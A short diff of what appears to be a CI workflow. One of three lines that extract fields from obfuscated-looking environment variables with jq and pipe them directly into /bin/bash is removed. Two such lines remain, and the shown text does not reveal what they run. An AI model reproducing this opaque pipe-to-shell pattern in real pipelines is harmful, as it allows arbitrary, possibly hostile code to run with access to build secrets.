@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$piyb8616" | jq -r .cbdo399 | /bin/bash
           printf '%s' "$fdk8347" | jq -r .wi98 | /bin/bash
-          printf '%s' "$rsp3182" | jq -r .mlxa2 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
